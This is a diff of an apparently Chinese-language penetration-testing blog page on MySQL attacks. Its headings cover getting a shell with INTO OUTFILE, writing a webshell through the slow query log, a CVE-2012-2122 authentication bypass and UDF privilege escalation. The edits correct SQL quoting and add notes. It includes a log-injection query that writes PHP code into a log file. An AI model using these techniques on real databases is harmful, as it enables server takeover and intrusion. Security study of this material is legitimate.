@@ -136,6 +136,7 @@
 </blockquote>
 <a id="more"></a> 
 
+
 <h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="Mysql-GetShell"><a href="#Mysql-GetShell" class="headerlink" title="Mysql GetShell"></a>Mysql GetShell</h2><h3 id="INTO-OUTFILE-Get-WebShell"><a href="#INTO-OUTFILE-Get-WebShell" class="headerlink" title="INTO OUTFILE Get WebShell"></a>INTO OUTFILE Get WebShell</h3><blockquote>
 <p>前提需要满足的条件。</p>
 </blockquote>
@@ -212,7 +213,7 @@
 <li>需要权限为<code>DBA</code>，拥有数据库root权限;</li>
 <li><code>secure_file_priv</code> 无限制;</li>
 </ul>
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE %slow<span class="emphasis">_query_</span>log%;</span><br><span class="line"><span class="code">+------------------+</span>---------------------------------+</span><br><span class="line">| Variable<span class="emphasis">_name    | Value                           |</span></span><br><span class="line"><span class="emphasis">+------------------+---------------------------------+</span></span><br><span class="line"><span class="emphasis">| slow_</span>query<span class="emphasis">_log   | OFF                             |</span></span><br><span class="line"><span class="emphasis">| slow_</span>query<span class="emphasis">_log_</span>file | /var/lib/mysql/test.log             |</span><br><span class="line"><span class="code">+------------------+</span>---------------------------------+</span><br></pre></td></tr></table></figure>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="emphasis">&#x27;%slow_query_log%&#x27;</span>;</span><br><span class="line"><span class="code">+------------------+</span>---------------------------------+</span><br><span class="line">| Variable<span class="emphasis">_name    | Value                           |</span></span><br><span class="line"><span class="emphasis">+------------------+---------------------------------+</span></span><br><span class="line"><span class="emphasis">| slow_</span>query<span class="emphasis">_log   | OFF                             |</span></span><br><span class="line"><span class="emphasis">| slow_</span>query<span class="emphasis">_log_</span>file | /var/lib/mysql/test.log             |</span><br><span class="line"><span class="code">+------------------+</span>---------------------------------+</span><br><span class="line"></span><br><span class="line"># 查看全局配置</span><br><span class="line">show variables like <span class="emphasis">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -226,7 +227,7 @@
 </blockquote>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;php? phpinfo(); ?&gt;&#x27;</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>
 
-<p>写入成功后通过刚才的日志 <code>SHOW VARIABLES LIKE %slow_query_log%;</code>结果恢复设置。</p>
+<p>写入成功后通过刚才的日志 <code>SHOW VARIABLES LIKE &#39;%slow_query_log%&#39;;</code>结果恢复设置。</p>
 <h3 id="身份认证绕过"><a href="#身份认证绕过" class="headerlink" title="身份认证绕过"></a>身份认证绕过</h3><blockquote>
 <p>(CVE-2012-2122)受影响的版本包括:</p>
 </blockquote>
@@ -241,7 +242,7 @@
 
 
 <h2 id="Mysql-提权"><a href="#Mysql-提权" class="headerlink" title="Mysql 提权"></a>Mysql 提权</h2><h3 id="UDP提权"><a href="#UDP提权" class="headerlink" title="UDP提权"></a>UDP提权</h3><blockquote>
-<p>Use Defined Function 用户自定义函数，数据库功能的一种扩展，用户可通过自定义函数实现在<code>Mysql</code>中无法实现的功能，可以像<code>version()</code>一样的方便调用。需要将<code>UDF</code>文件上传到Mysql的目录中进行调用。</p>
+<p>Use Defined Function 用户自定义函数，数据库功能的一种扩展，用户可通过自定义函数实现在<code>Mysql</code>中无法实现的功能，可以像<code>version()</code>一样的方便调用。需要将<code>UDF</code>文件上传到Mysql的目录中进行调用。从<code>5.0</code>开始支持UDF。</p>
 </blockquote>
 <blockquote>
 <p>前提需要满足的条件:</p>
